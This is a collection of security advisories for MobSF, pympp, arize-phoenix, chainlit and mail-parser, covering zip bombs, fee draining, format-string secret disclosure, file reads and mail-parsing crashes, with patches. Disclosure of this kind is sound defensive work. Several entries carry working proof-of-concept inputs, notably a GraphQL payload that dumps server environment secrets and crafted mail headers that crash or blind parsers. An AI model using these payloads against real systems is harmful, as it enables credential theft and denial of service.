Details: MobSF is a widely adopted mobile application security testing tool used by security teams across numerous organizations. Typically, MobSF is deployed on centralized internal or cloud-based servers that also host other security tools and web applications. Access to the MobSF web interface is often granted to internal security teams, audit teams, and external vendors.

MobSF provides a feature that allows users to upload ZIP files for static analysis. Upon upload, these ZIP files are automatically extracted and stored within the MobSF directory. However, this functionality lacks a check on the total uncompressed size of the ZIP file, making it vulnerable to a ZIP of Death (zip bomb) attack.

Due to the absence of safeguards against oversized extractions, an attacker can craft a specially prepared ZIP file that is small in compressed form but expands to a massive size upon extraction. Exploiting this, an attacker can exhaust the server's disk space, leading to a complete denial of service (DoS) not just for MobSF, but also for any other applications or websites hosted on the same server.

Attack Scenario: Suppose the server hosting MobSF has 5 GB of free disk space..

A malicious user will first create a genuine hello world application code using android studio and inside this code directory (app//src/main/java/APK_PATH/bomb.txt) he'll place a bomb.txt file.

This bomb.txt file will have billions of zeros to increase the file size on storage and make it to 4.99 GB. Now suppose the resultant hello world code directory including original code and bomb.txt files will be of 5GB, so the attacker will compress the entire hello world code directory to zip and resultant zip will be around 12-15 MBs only.

An attacker will upload this zip bomb using the MobSF web interface or API. So an attacker will spend only 12-15 MB of his bandwidth.

Now the MobSF tool will extract that zip file and it'll be automatically converted into its original size 5GB.

So now a web server will be forced to store 5GB of data and its storage will be exhausted by an attacker's single request.

Web server's storage and resources will not be able to handle other running websites or applications as the storage is exhausted. This way an attacker can achieve complete Web Server Resource Exhaustion.

Impact:

  1. This vulnerability can lead to complete server disruption in an organization which can affect other internal portals and tools too (which are hosted on the same server).
  2. If some organization has created their customised cloud based mobile security tool using MobSF core then an attacker can exploit this vulnerability to crash their servers.

POC:

  1. Screen Recording :
    https://drive.google.com/file/d/1x7GEPJr2T04Ij5ZFQQtGWvUWXtM4M4aw/view?usp=sharing
  2. POC Zip Bomb File (Upon extraction this file will consume 6GB of storage) : https://drive.google.com/file/d/1N3apL1ySMecnt3HUQcDcuH7hsjPrdwUj/view?usp=sharing

Mitigation: It is recommended to implement a safeguard that checks the total uncompressed size of any uploaded ZIP file before extraction. If the estimated uncompressed size exceeds a safe threshold (e.g., 100 MB), MobSF should reject the file and notify the user.

entry.title: [pympp] pympp allows excessive sponsored transaction fees through padded calldata
entry.content:
Details

When the server acts as the fee_payer, pympp 0.8.0 validates calldata using eth_abi decoding, which is lenient about trailing bytes. The FeePayerPolicy caps gas_limit (≤ 2 M) and max_fee_per_gas (≤ 100 Gwei) but does not check calldata length.

Tempo uses legacy calldata gas pricing: 16 gas per non-zero byte. Appending N bytes of 0x01 padding inflates actual gas used by N × 16 while keeping gas_limit and max_fee_per_gas within policy caps. The server cosigns and broadcasts the padded transaction, draining its fee-payer wallet.

Vulnerable code path: FeePayerPolicy in fee_payer_policy.py (pympp 0.8.0) enforces maxGas = 2_000_000 and maxFeePerGas = 100 Gwei but has no calldata.length bound. The policy check passes because the inflated gas comes from intrinsic calldata cost, not the declared gas_limit.

Note: In our experiment, we enforce an 16 KB max_header_length, which caps the maximum effective padding at roughly 5,500 bytes. The default padding in this PoC (5,500 bytes) is within that limit.

PoC

The PoC is provided below. It is configured to reproduce the attack on Tempo Moderate testnet within a Docker environment. Download the PoC and run:

unzip pympp_python_PoC.zip
cd pympp_python
docker build -t pympp-padding .
docker run --rm pympp-padding

There are more details in pympp_python/README.md

Impact

In our experiment, a malicious client can force the server to pay ~5x the normal transaction fee. This dramatically increases operational costs and completely destroys the profit margin on low-cost items.

Please provide a way to share the PoC in .zip format to you. Thank you!

entry.title: [arize-phoenix] Phoenix: Format String Injection in applyChatTemplate
entry.content:
• Summary

A format string injection vulnerability in the applyChatTemplate GraphQL endpoint allows an attacker to read server-side environment variables, cryptographic secrets, and internal module attributes directly from the API response. On default Phoenix installations where authentication is disabled the endpoint is reachable with no credentials. On auth-enabled deployments, any account regardless of privilege level is sufficient to exploit it.

  • Impact Server filesystem paths, loaded Python module names, and internal configuration constants are fully disclosed, an attacker with network access can read the full server os.environ including the admin credentials hardcoded in phoenix.auth.

Successful exploitation allows an attacker to extract PHOENIX_SECRET, the master key used to sign all JWTs and derive the Fernet encryption key protecting stored credentials (LLM API keys, OAuth tokens). With this key, an attacker can forge admin-level session tokens and decrypt all secrets stored in the database.

  • Affected Versions

First vulnerable release: arize-phoenix-v13.0.0 (2026-02-13) Latest confirmed vulnerable release: arize-phoenix-v14.8.0 (2026-04-17)

  • Affected Component applyChatTemplate GraphQL query endpoint (src/phoenix/server/api/queries.py:1638) FStringTemplateFormatter._format() template rendering function (src/phoenix/utilities/template_formatters.py:272) DotDict.__getattr__() ineffective attribute access control (src/phoenix/utilities/template_formatters.py:90)

  • Proof of Concept payload as txt with an image performing the exploit below.

  • Payload:

{
  "query": "query($t: PromptChatTemplateInput!, $o: PromptTemplateOptions!) { applyChatTemplate(template: $t, templateOptions: $o) { messages { content { ... on TextContentPart { text { text } } } } } }",
  "variables": {
    "t": { "messages": [{ "role": "USER", "content": [{ "text": { "text": "{u.__class__.__bases__[0].__init__.__globals__[_os].environ}" } }] }] },
    "o": { "format": "F_STRING", "variables": { "u": { "x": 1 } } }
  }
}
  • Suggested Fix

Three mitigations are recommended in combination: restrict attribute traversal at the Formatter.get_field() level (not the wrapper class), add IsAuthenticated permission to the applyChatTemplate resolver, and limit F_STRING format to trusted system-defined templates only.

Best Regards, Omar

entry.title: [chainlit] chainlit : Chainlit allows authenticated arbitrary file reads through custom element updates
entry.content:
Chainlit versions prior to 2.9.4 contain an arbitrary file read vulnerability in the /project/element update flow. An authenticated client can send a custom Element with a user-controlled path value, causing the server to copy the referenced file into the attacker’s session. The resulting element identifier (chainlitKey) can then be used to retrieve the file contents via /project/file/, allowing disclosure of any file readable by the Chainlit service.

entry.title: [mail-parser] mail-parser: One hostile attachment aborts `write_attachments()` and silently drops the rest of the batch
entry.content:
Impact

write_attachments() called _safe_attachment_filename() and write_sample() inside its loop with no guard, so a single crafted attachment raised out of the whole save. Every attachment after the malicious one was silently never written, with no error surfaced to a caller that catches only MailParserError.

That is an evasion primitive as much as an availability bug: a sender puts one poisoned part first and the real payload second, and the payload never reaches the extraction directory that a downstream scanner or sandbox reads — while it still reaches the recipient's mail client intact. The tool's output diverges from the bytes actually in the message, which is the same failure mode as the filename-sanitizing bypass in GHSA-fr3h-cpq2-9496.

Three shapes were reachable, all from attacker-controlled MIME metadata:

  • NUL smuggled through RFC 2231 — filename*=us-ascii''evil%00.bin decodes to a NUL in the filename during parsing and raised ValueError out of the name check;
  • overlong basename — a filename longer than NAME_MAX (e.g. 300 characters) raised OSError: File name too long from open(), after creating a zero-byte stub on disk;
  • undecodable payload — a body that is not valid base64 raised binascii.Error (a ValueError subclass) from the decode performed inside the open() block.
import tempfile, mailparser

raw = ("Content-Type: multipart/mixed; boundary=b\r\n\r\n"
       "--b\r\nContent-Type: application/octet-stream\r\n"
       "Content-Disposition: attachment; filename*=us-ascii''evil%00.bin\r\n\r\nxx\r\n"
       "--b\r\nContent-Type: application/octet-stream\r\n"
       "Content-Disposition: attachment; filename=good.bin\r\n\r\nyy\r\n"
       "--b--\r\n")

mp = mailparser.parse_from_string(raw)     # parse itself is fine; safe_filename is None
mp.write_attachments(tempfile.mkdtemp())
# 4.6.0 - 4.6.2 -> ValueError, and good.bin is never written
# 4.6.3         -> logs "Skipped attachment with invalid filename: 'evil\x00.bin'";
#                  good.bin is written

parse() itself was never affected — it catches the ValueError — so only the write path was unguarded. The reject-paths that made this reachable were introduced with the filename sanitizing in 4.6.0 (PR #165).

Patches

Fixed in 4.6.3. write_attachments() now logs and skips a single unusable attachment instead of aborting the batch:

  • an invalid filename is caught and skipped;
  • overlong basenames are truncated to 240 UTF-8 bytes, preserving the extension, rather than reaching open();
  • the base64 decode moved before open(), so a failure leaves no zero-byte stub, and it now repairs padding and alphabet errors the way mail clients do (matching MIME::Base64 on 2008 cases) — rejecting them let a sender append one character to make an attachment vanish from the extraction directory while it still reached the recipient;
  • MailParserPathError is deliberately not caught by the per-attachment handler: a containment failure is not a per-attachment problem, and path-containment checks now raise MailParserPathError instead of ValueError so the broader catch cannot swallow them.

Deduplication was hardened in the same change: it reserves room for its own suffix marker (write_sample() sanitizes again, and the clamp there used to cut the marker back off, collapsing distinct attachments onto one file), resumes from the last used suffix per stem instead of rescanning from 1 (quadratic before — 16000 same-named attachments took 14 s, now milliseconds), and folds case, because APFS, exFAT and SMB collapse Invoice.pdf and invoice.pdf.

Workarounds

Upgrade to 4.6.3. If you cannot upgrade, do not call write_attachments() on untrusted mail; iterate parser.attachments yourself and write each attachment inside its own try/except Exception, skipping the ones whose safe_filename is None.

References

entry.title: [mail-parser] mail-parser: Uncaught `OverflowError` / `OSError` on an out-of-range `Received` date
entry.content:
Impact

A Received header whose trailing date carries an out-of-range year, or a timezone offset large enough to push the timestamp past the int64 epoch range, raises an exception that is outside the MailParser* hierarchy. A caller that catches only mail-parser exceptions does not catch it, and the parse of the entire message is aborted — the same class of issue as GHSA-24mq-4vc6-2prf, which this survives (it is not a duplicate; 24mq is fixed in 4.6.2 and this reproduces on 4.6.2).

All entry points are affected: parse_from_string(), parse_from_bytes(), parse_from_file(), parse_from_file_obj() and the mail-parser CLI. The header is fully attacker-controlled and a single line is enough, so any pipeline that parses untrusted mail can be made to lose the message — and, if one worker handles a queue, to drop the batch.

import mailparser

raw = ("Received: from x ([1.2.3.4]) by mx.victim.com; "
       "Tue, 7 Mar 292277026596 14:29:24 +0000\r\n\r\nbody\r\n")
mailparser.parse_from_string(raw).mail_json
# <= 4.6.2 -> OverflowError: signed integer is greater than maximum
# 4.6.3    -> parses; the unusable hop date is reported as "date_utc": null

Root cause. receiveds_format() in src/mailparser/utils.py guarded the date conversion with except (TypeError, ValueError), but convert_mail_date() → email.utils.mktime_tz() → calendar.timegm() raises OverflowError for years whose epoch seconds overflow int64, and datetime.fromtimestamp() reports EOVERFLOW as OSError for a sufficiently large timezone offset. The date and timezone properties already wrapped the same conversion in except Exception; only the Received path was left open.

Affected range. Introduced by the date-handling change in ca2aa6a, first released in 3.7.0. Reproduced on PyPI 3.7.0, 3.8.0, 3.9.3, 4.0.0, 4.5.0, 4.6.0, 4.6.2 and on master before the fix (Python 3.14). 3.6.0 is not affected.

Patches

Fixed in 4.6.3. receiveds_format() now also catches OverflowError and OSError and records date_utc = None for that hop, so the rest of the message still parses:

try:
    j["date_utc"], _ = convert_mail_date(i["date"])
except (TypeError, ValueError, OverflowError, OSError):
    j["date_utc"] = None

A sweep of year magnitudes from 10^7 to 10^12 shows only ValueError, OverflowError and OSError are reachable on this path.

Workarounds

Upgrade to 4.6.3. If you cannot upgrade, wrap every parse_from_* call in a bare except Exception rather than except MailParserError, and treat the message as unparsed.

References

  • Fix: https://github.com/SpamScope/mail-parser/pull/171
  • Related: GHSA-24mq-4vc6-2prf

entry.title: [mail-parser] mail-parser: Uncaught exceptions and silent header loss in mail-parser on attacker-controlled input
entry.content:
Impact

Two effects, sharing the root cause of Advisory 1 — header names chosen by the sender were resolved through Python attribute lookup and rewritten before lookup.

Uncaught exceptions. A crafted message raises an exception that is outside the MailParser* hierarchy, so a caller catching only mail-parser exceptions does not catch it and the worker dies.

Header named after a method (CWE-248, reported by @iam-niranjan). Python resolves real class attributes before __getattr__, so a header named after a method put a bound method object into the parsed mail dict. A 12-byte email is sufficient. Nine colliding names were confirmed: Parse, Message, Write_Attachments, From_File, From_File_Obj, From_File_Msg, From_String, From_Bytes, Get_Server_Ipaddress. Also reproducible from the CLI (mail-parser -f evil.eml -j).

import mailparser
mailparser.parse_from_string("Parse: x\r\n\r\n").mail_json
# 4.6.1 -> TypeError: Object of type method is not JSON serializable
# 4.6.2 -> {"parse": "x", "has_defects": false}

Header carrying 8-bit bytes (CWE-248). For a header containing raw 8-bit bytes, Python's compat32 policy returns an email.header.Header rather than a str, which the _raw accessor passed straight to json.dumps. This fires on entirely benign non-ASCII mail via parse_from_bytes(), the normal entry point for mail off the wire.

import mailparser
mailparser.parse_from_bytes(b"Subject: caf\xe9\r\n\r\nbody\r\n").subject_raw
# 4.6.1 -> TypeError: Object of type Header is not JSON serializable
# 4.6.2 -> '["caf�"]'

Silent loss of message content (CWE-436). A sender can make a header's value vanish from every output surface, or be replaced by a different header's value, with has_defects remaining false. This is an evasion primitive: the tool's output diverges from the bytes actually in the message, and a pipeline scanning parsed output for indicators sees nothing and no failure signal.

Header names were normalised before lookup — underscores folded to dashes, and _json / _raw suffixes interpreted — so a header genuinely named Subject_json was reported with the value of Subject and its own value discarded, and any header whose name contains an underscore resolved to nothing.

import mailparser

raw = ("From: Real Sender <real@good.example>\r\n"
       "Subject: innocuous\r\n"
       "Subject_json: MALWARE-C2 http://evil.example/payload.exe\r\n"
       "X_Spam_Flag: YES\r\n\r\nbody\r\n")
mail = mailparser.parse_from_string(raw)
print(mail.mail["subject_json"])       # 4.6.1 -> '"innocuous"'   4.6.2 -> the real value
print(mail.headers["X_Spam_Flag"])     # 4.6.1 -> ''              4.6.2 -> 'YES'
print("MALWARE-C2" in mail.mail_json)  # 4.6.1 -> False           4.6.2 -> True
print(mail.has_defects)                # both  -> False

A related case: email.message.Message.__len__ returns the header count, so a message with no headers is falsy. parse() returned before initialising state, and the unset attributes were then absorbed by __getattr__ and answered as absent headers. Every property returned '' — including mail and attachments, which are documented to return a dict and a list — with no error and no defect flag.

import mailparser
mail = mailparser.parse_from_string("Click http://evil.example/pay.exe now\r\n")
print(repr(mail.body))         # 4.6.1 -> ''    4.6.2 -> the text
print(repr(mail.attachments))  # 4.6.1 -> ''    4.6.2 -> []
print(mail.has_defects)        # 4.6.1 -> ''    4.6.2 -> True

Patches

Fixed in 4.6.2. Upgrade with pip install --upgrade mail-parser.

Header names taken from a message are now looked up literally — no attribute access, no case or separator folding, no suffix interpretation — so no header name can collide with a method or property, and no value can be substituted or dropped. 8-bit values are coerced to str before serialisation. Parser state is initialised before the message check, which now tests is None, and attribute names beginning with _ raise AttributeError instead of being answered as headers.

Behaviour changes. Header names now appear in mail and headers exactly as sent, so a header named X_Spam_Flag keeps that name and its own value. X_raw always returns a JSON array — an absent header yields [] where 4.6.1 returned null.

Workarounds

None for the data loss. For the uncaught exceptions, callers who cannot upgrade should wrap mail_json, mail_partial_json, headers_json and any X_raw access in a bare except Exception rather than catching only MailParserError subclasses.

References

  • https://nvd.nist.gov/vuln/detail/CVE-2026-129299

entry.title: [mail-parser] mail-parser: Sender IP address spoofing in get_server_ipaddress()
entry.content:
Patches

Fixed in 4.6.2. Upgrade with pip install --upgrade mail-parser.

Candidate addresses are now selected by position, not by appearance — a bracketed address the sender wrote is byte-identical to one the MTA wrote, so no amount of pattern matching can tell them apart:

  • the first token of the from clause is the HELO name, whatever its shape, and is never a candidate;
  • an explicit HELO marker inside a comment group is sender text and is excluded;
  • a candidate must sit inside a ( / [ group;
  • IPv4 and IPv6 matches are merged positionally, never family-first;
  • the walk stops at the first trusted hop naming no address, rather than continuing into sender-written headers.

The IPv6 pattern was corrected to skip the IPv6: tag and to prefer the longest valid form.

Behaviour change. get_server_ipaddress() now returns None rather than an unreliable value in two cases that previously returned an address: a from clause consisting of a bare address with no HELO marker (indistinguishable from EHLO <that address>), and a trusted hop naming no address at all. Callers must handle None.

Workarounds

None within mail-parser. Callers who cannot upgrade should not treat the return value of get_server_ipaddress() as trustworthy, and should derive sender attribution from an authenticated signal instead — the MTA's own logs, or SPF/DKIM/DMARC results computed outside this library.

References

entry.title: [mail-parser] mail-parser is vulnerable to polynomial ReDoS in email header parsing
entry.content:
Summary

Two regular expressions used while parsing email headers backtrack polynomially on attacker-controlled input. Parsing a single small, well-formed email can consume minutes to hours of CPU, denying service to any process that parses untrusted mail.

Both are reachable from an ordinary parse_from_string(), parse_from_bytes() or parse_from_file() call — no special API, option, or malformed structure is required by the victim.

Details

1. Address-header fallback regex (src/mailparser/utils.py)

get_addresses() falls back to _ADDR_FALLBACK_RE whenever email.utils.getaddresses(strict=True) yields no usable address. The alternative ([^<,]*?)\s*<([^>]+)> overlaps a lazy quantifier with an adjacent \s* — a space matches both. Driven by finditer, which retries at every offset and rescans the remainder, matching degrades to quadratic on < padding and cubic on whitespace padding.

The fallback engages on the feature's own happy path, e.g. From: alice@example.com <bob@example.com>.

Measured (4.6.0, CPython 3.14, macOS arm64; reproduced identically on Linux and on CPython 3.9, 3.11, 3.12, 3.13):

Padding Parse time
valid address + 750 sp 0.38 s
+ 1500 sp 2.97 s
+ 3000 sp 23.4 s (×7.9/2×)
+ 6 KB sp 185 s
~100 KB sp hours

Fully RFC 5322-compliant folded headers (all lines ≤ 71 octets) trigger the same blowup, so the input passes normal MTA and library checks. ~100 KB of headers is within Postfix's default header_size_limit = 102400.

All six address headers parsed by the library (From, To, Cc, Bcc, Reply-To, Delivered-To) are affected and their cost adds up linearly.

2. Received-header clause splitter (src/mailparser/const.py)

parse_received() splits on _CLAUSE_SPLITTER, (?:^|\s+)(from|by|via|with|id|for|envelope-from)\s+. Under re.split this backtracks quadratically over any whitespace run that is not followed by a clause keyword. The pre-existing normalization collapsed only [\t\n], so literal spaces — including folded-header padding — reached the splitter intact.

Measured: 24 000 spaces in one Received: header → 22 s; ~100 KB → minutes.

Impact

Availability. A handful of small emails keeps every parsing worker of a mail gateway, ticketing system, quarantine UI, or archiving pipeline permanently busy. No confidentiality or integrity impact.

Anyone who parses email they did not author is affected — which is the library's purpose.

Patches

Fixed in 4.6.1.

  • The address fallback is now a linear scan: the header is split into comma-separated items (quote-aware, in Python), then each item is matched against a bounded angle-address <([^<>\s]+)> with the display name derived in Python, falling back to a bare-email match. Each pattern has a single non-nested quantifier over a negated character class → O(n). 2000 padding spaces: 3.5 s → <0.01 s. 256 KB padding: hours → 0.087 s. Output is preserved on every previously supported shape.
  • parse_received() collapses whitespace runs to a single space before splitting, so the splitter's \s+ only ever matches one character → O(n). The date is extracted from the raw header beforehand, so date formatting is unaffected. 24 000 spaces: 22 s → 0.003 s; 200 000 spaces: 0.004 s.

Regression tests assert linear-time behaviour for both paths.

Workarounds

None within the library. Upgrade to 4.6.1.

Users who cannot upgrade immediately should cap total header size before parsing and enforce a wall-clock timeout around each parse.
